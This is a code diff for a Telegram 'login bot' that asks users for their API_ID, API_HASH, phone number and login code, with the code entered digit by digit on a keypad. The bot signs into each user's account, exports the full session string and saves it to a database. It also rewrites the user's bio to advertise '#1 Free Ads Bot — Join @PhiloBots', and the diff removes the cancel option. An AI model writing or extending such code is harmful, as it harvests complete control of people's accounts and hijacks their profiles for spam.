@@ -1,6 +1,8 @@
+# login_bot.py
+# style same as screenshot: Step 1/2/3 + big reply-keypad for OTP
+
 import asyncio
 import os
-from datetime import datetime, timedelta
 
 from aiogram import Bot, Dispatcher
 from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
@@ -20,9 +22,6 @@ bot = Bot(LOGIN_BOT_TOKEN)
 dp = Dispatcher()
 init_db()
 
-# how long code is valid in our state (Telegram has its own limit too)
-STATE_CODE_TTL_SEC = 180
-
 
 class Login(StatesGroup):
     api_id = State()
@@ -31,16 +30,14 @@ class Login(StatesGroup):
     otp = State()
 
 
-def kb_otp() -> ReplyKeyboardMarkup:
-    # same layout as screenshot
+def otp_kb() -> ReplyKeyboardMarkup:
     return ReplyKeyboardMarkup(
         keyboard=[
             [KeyboardButton(text="1"), KeyboardButton(text="2"), KeyboardButton(text="3")],
             [KeyboardButton(text="4"), KeyboardButton(text="5"), KeyboardButton(text="6")],
             [KeyboardButton(text="7"), KeyboardButton(text="8"), KeyboardButton(text="9")],
             [KeyboardButton(text="0")],
-            [KeyboardButton(text="⬅️ Back"), KeyboardButton(text="🧹 Clear"), KeyboardButton(text="✅ Submit")],
-            [KeyboardButton(text="🔁 Resend"), KeyboardButton(text="✏️ Change phone"), KeyboardButton(text="❌ Cancel")],
+            [KeyboardButton(text="⬅ Back"), KeyboardButton(text="🧹 Clear"), KeyboardButton(text="✔ Submit")],
         ],
         resize_keyboard=True,
         one_time_keyboard=False,
@@ -51,39 +48,46 @@ def kb_otp() -> ReplyKeyboardMarkup:
 @dp.message(Command("start"))
 async def cmd_start(msg: Message, state: FSMContext):
     await state.clear()
-    await msg.answer("Send your API ID (number).", reply_markup=ReplyKeyboardRemove())
+    await msg.answer(
+        "Step 1 — Send your <b>API_ID</b>.\n"
+        "Get it at <a href=\"https://my.telegram.org\">my.telegram.org</a> → API Development Tools.",
+        parse_mode="HTML",
+        reply_markup=ReplyKeyboardRemove()
+    )
     await state.set_state(Login.api_id)
 
 
-@dp.message(Command("cancel"))
-async def cmd_cancel(msg: Message, state: FSMContext):
-    await state.clear()
-    await msg.answer("Cancelled.", reply_markup=ReplyKeyboardRemove())
-
-
 @dp.message(Login.api_id)
-async def step_api_id(msg: Message, state: FSMContext):
+async def get_api_id(msg: Message, state: FSMContext):
+    text = msg.text.strip()
     try:
-        api_id = int(msg.text.strip())
+        api_id = int(text)
     except ValueError:
-        await msg.answer("API ID must be a number. Send again.")
+        await msg.answer("API_ID must be a number. Send again.")
         return
     await state.update_data(api_id=api_id)
-    await msg.answer("OK. Now send your API HASH.")
+    await msg.answer("Step 2 — Paste your <b>API_HASH</b>.", parse_mode="HTML")
     await state.set_state(Login.api_hash)
 
 
 @dp.message(Login.api_hash)
-async def step_api_hash(msg: Message, state: FSMContext):
+async def get_api_hash(msg: Message, state: FSMContext):
     api_hash = msg.text.strip()
     await state.update_data(api_hash=api_hash)
-    await msg.answer("Now send your phone with country code (e.g. +918000000000)")
+    await msg.answer("Step 3 — Send your phone as +countrycode number.")
     await state.set_state(Login.phone)
 
 
-async def _send_code_for_user(user_id: int, api_id: int, api_hash: str, phone: str):
+@dp.message(Login.phone)
+async def get_phone(msg: Message, state: FSMContext):
+    data = await state.get_data()
+    api_id = data["api_id"]
+    api_hash = data["api_hash"]
+    phone = msg.text.strip()
+
+    # send code via pyrogram
     client = Client(
-        name=f"login-{user_id}",
+        name=f"login-{msg.from_user.id}",
         api_id=api_id,
         api_hash=api_hash,
         in_memory=True,
@@ -91,34 +95,19 @@ async def _send_code_for_user(user_id: int, api_id: int, api_hash: str, phone: s
     await client.connect()
     sent = await client.send_code(phone)
     await client.disconnect()
-    return sent.phone_code_hash
-
-
-@dp.message(Login.phone)
-async def step_phone(msg: Message, state: FSMContext):
-    data = await state.get_data()
-    api_id = data["api_id"]
-    api_hash = data["api_hash"]
-    phone = msg.text.strip()
-
-    try:
-        phone_code_hash = await _send_code_for_user(msg.from_user.id, api_id, api_hash, phone)
-    except Exception as e:
-        await msg.answer(f"Could not send code: {e}")
-        return
 
     await state.update_data(
         phone=phone,
-        phone_code_hash=phone_code_hash,
-        code="",
-        code_sent_at=datetime.utcnow().isoformat(),
+        phone_code_hash=sent.phone_code_hash,
+        code=""  # collected digits
     )
-    await msg.answer("Verification Code\nUse the keypad below.", reply_markup=kb_otp())
+
+    await msg.answer("Verification Code\nUse the keypad below.", reply_markup=otp_kb())
     await state.set_state(Login.otp)
 
 
 @dp.message(Login.otp)
-async def step_otp(msg: Message, state: FSMContext):
+async def get_otp(msg: Message, state: FSMContext):
     data = await state.get_data()
     api_id = data["api_id"]
     api_hash = data["api_hash"]
@@ -127,71 +116,36 @@ async def step_otp(msg: Message, state: FSMContext):
     code = data.get("code", "")
     txt = msg.text.strip()
 
-    # helper to check TTL
-    sent_at_iso = data.get("code_sent_at")
-    if sent_at_iso:
-        sent_at = datetime.fromisoformat(sent_at_iso)
-        if datetime.utcnow() - sent_at > timedelta(seconds=STATE_CODE_TTL_SEC):
-            # local TTL over → suggest resend
-            await msg.answer("Code probably expired. Press ‘🔁 Resend’.", reply_markup=kb_otp())
-            return
-
-    # Cancel
-    if txt == "❌ Cancel":
-        await state.clear()
-        await msg.answer("Cancelled.", reply_markup=ReplyKeyboardRemove())
-        return
-
-    # Change phone
-    if txt == "✏️ Change phone":
-        await state.set_state(Login.phone)
-        await msg.answer("Send new phone (with country code).", reply_markup=ReplyKeyboardRemove())
-        return
-
-    # Resend
-    if txt == "🔁 Resend":
-        try:
-            new_hash = await _send_code_for_user(msg.from_user.id, api_id, api_hash, phone)
-        except Exception as e:
-            await msg.answer(f"Could not resend code: {e}", reply_markup=kb_otp())
-            return
-        await state.update_data(phone_code_hash=new_hash, code="", code_sent_at=datetime.utcnow().isoformat())
-        await msg.answer("New code sent. Use keypad below.", reply_markup=kb_otp())
-        return
-
-    # Clear
+    # special buttons
     if txt == "🧹 Clear":
         await state.update_data(code="")
-        await msg.answer("Verification Code\nUse the keypad below.", reply_markup=kb_otp())
+        await msg.answer("Verification Code\nUse the keypad below.", reply_markup=otp_kb())
         return
 
-    # Back
-    if txt == "⬅️ Back":
+    if txt == "⬅ Back":
         code = code[:-1]
         await state.update_data(code=code)
-        await msg.answer(f"Code: {code}", reply_markup=kb_otp())
+        # no reply so user can keep tapping fast
         return
 
-    # Digit
+    # digits: just store, don't reply -> faster input, less spam, less chance of expiry
     if txt.isdigit():
-        # max 8 just to be safe
-        if len(code) >= 8:
-            await msg.answer(f"Code: {code}", reply_markup=kb_otp())
-            return
-        code += txt
-        await state.update_data(code=code)
-        await msg.answer(f"Code: {code}", reply_markup=kb_otp())
+        if len(code) < 8:
+            code += txt
+            await state.update_data(code=code)
         return
 
-    # Submit
-    if txt != "✅ Submit":
+    # only submit actually tries login
+    if txt != "✔ Submit":
         return
 
+    # final combined code
+    code = (await state.get_data()).get("code", "")
     if not (4 <= len(code) <= 8):
-        await msg.answer("Enter 4–8 digits, then Submit.", reply_markup=kb_otp())
+        await msg.answer("Enter 4–8 digits, then press Submit.", reply_markup=otp_kb())
         return
 
-    # try to sign in
+    # try sign-in
     client = Client(
         name=f"login-{msg.from_user.id}",
         api_id=api_id,
@@ -206,16 +160,16 @@ async def step_otp(msg: Message, state: FSMContext):
             phone_code=code
         )
     except PhoneCodeExpired:
-        # ask to resend
-        new_hash = await client.send_code(phone)
+        # resend new code and ask again
+        new_sent = await client.send_code(phone)
         await client.disconnect()
-        await state.update_data(phone_code_hash=new_hash.phone_code_hash, code="", code_sent_at=datetime.utcnow().isoformat())
-        await msg.answer("Code expired. Sent new one.\nUse keypad.", reply_markup=kb_otp())
+        await state.update_data(phone_code_hash=new_sent.phone_code_hash, code="")
+        await msg.answer("Code expired. New code sent.\nVerification Code\nUse the keypad below.", reply_markup=otp_kb())
         return
     except PhoneCodeInvalid:
         await client.disconnect()
         await state.update_data(code="")
-        await msg.answer("Wrong code. Try again.", reply_markup=kb_otp())
+        await msg.answer("❌ Wrong code. Try again.\nVerification Code\nUse the keypad below.", reply_markup=otp_kb())
         return
     except Exception as e:
         await client.disconnect()
@@ -223,10 +177,10 @@ async def step_otp(msg: Message, state: FSMContext):
         await msg.answer(f"Login failed: {e}\n/start again", reply_markup=ReplyKeyboardRemove())
         return
 
-    # success
+    # success — export session
     session_str = await client.export_session_string()
 
-    # brand (best effort)
+    # branding (best effort)
     try:
         await client.update_profile(bio="#1 Free Ads Bot — Join @PhiloBots")
         me = await client.get_me()
@@ -237,7 +191,7 @@ async def step_otp(msg: Message, state: FSMContext):
 
     await client.disconnect()
 
-    # save
+    # save to DB
     conn = get_conn()
     conn.execute(
         "INSERT INTO user_sessions(user_id, api_id, api_hash, session_string) "
@@ -258,4 +212,3 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
-            
